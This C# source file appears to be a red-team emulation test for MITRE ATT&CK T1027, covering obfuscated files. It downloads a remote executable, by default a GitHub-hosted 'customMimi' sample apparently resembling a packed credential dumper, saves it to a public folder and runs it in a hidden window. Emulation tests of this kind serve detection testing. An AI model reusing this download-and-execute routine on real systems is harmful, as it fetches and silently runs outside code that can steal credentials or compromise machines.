using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;

class Technique
{
    /*
    * 
    * T1027 (Obfuscated Files or Information).
    *
    * Possible Parameters:
    * 
    *   1 - executionMethod - Required
    *       Obfuscation method to be tested during execution. Padding, Packing, Stego or Indicator.
    *
    *   2 - remoteFile - Optional
    *       URL to the remote file to be downloaded. Should be a software packed file (i.e. a file packed with upx). 
    *       
    *   3 - localFile - Optional
    *       Local path to download the remoteFile to. Defaults to \Users\Public\debug.exe. Must contain the file name.
    *       
    *       TODO
    *       Change default localfile to workfolder variable
    *       Create the binary for the other execution methods
*/

    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    public static bool execCommand(string remoteFile, string localFile)
    {
        try
        {

            WebClient webClient = new WebClient();
            webClient.DownloadFile(remoteFile, localFile);

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = localFile;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;

            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            if (process.ExitCode == 0)
            {
                return true;
            }
            Console.WriteLine(process.StandardOutput.ReadToEnd());
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error:" + ex.Message);
        }
        return false;
    }
    public static void Main(string[] args)
    {
        string exeMethod = "";
        string remotePath = "";
        string localPath = "";
        string subTechnique = "";

        if (new[] { 1, 3 }.Contains(args.Length))
        {

            switch (args[0])
            {
                case "Padding":
                    if (args.Length == 1)
                    {
                        remotePath = "Path to default padding file";
                        localPath = @"\Users\Public\debug.exe";
                    }
                    else
                    {
                        remotePath = args[1];
                        localPath = args[2];
                    }
                    subTechnique = "001";
                    exeMethod = "Binary Padding";
                    break;

                case "Packing":
                    if (args.Length == 1)
                    {
                        remotePath = "https://raw.githubusercontent.com/Vulcanun/customMimi/master/sample.exe";
                        localPath = @"\Users\Public\debug.exe";
                    }
                    else
                    {
                        remotePath = args[1];
                        localPath = args[2];
                    }
                    subTechnique = "002";
                    exeMethod = "Software Packing";
                    break;

                case "Stego":
                    if (args.Length == 1)
                    {
                        remotePath = "Path to default padding file";
                        localPath = @"\Users\Public\debug.exe";
                    }
                    else
                    {
                        remotePath = args[1];
                        localPath = args[2];
                    }
                    subTechnique = "003";
                    exeMethod = "Steganography";
                    break;

                case "Indicator":
                    if (args.Length == 1)
                    {
                        remotePath = "Path to default padding file";
                        localPath = @"\Users\Public\debug.exe";
                    }
                    else
                    {
                        remotePath = args[1];
                        localPath = args[2];
                    }
                    subTechnique = "005";
                    exeMethod = "Indicator Removal";
                    break;

                default:
                    Console.WriteLine("[T1027] Invalid execution method received. Returning without execution.");
                    return;
            }
        }
        else
        {
            Console.WriteLine("[T1027] Did not receive the expected parameters. Returning without execution.");
            return;
        }

        Console.WriteLine("[T1027] Starting Execution!");

        Console.WriteLine("[T1027-" + subTechnique + "] Dropping obfuscated file: executionMethod '" + exeMethod + "', remotePath '" + remotePath + "', localPath '" + localPath + "'");
        if (execCommand(remotePath, localPath))
        {
            Console.WriteLine("[T1027-" + subTechnique + "] Successfully executed Technique (return 0)! ");
        }
        else
        {
            Console.WriteLine("[T1027-" + subTechnique + "] Oops, something went wrong! ");
        }
    }
}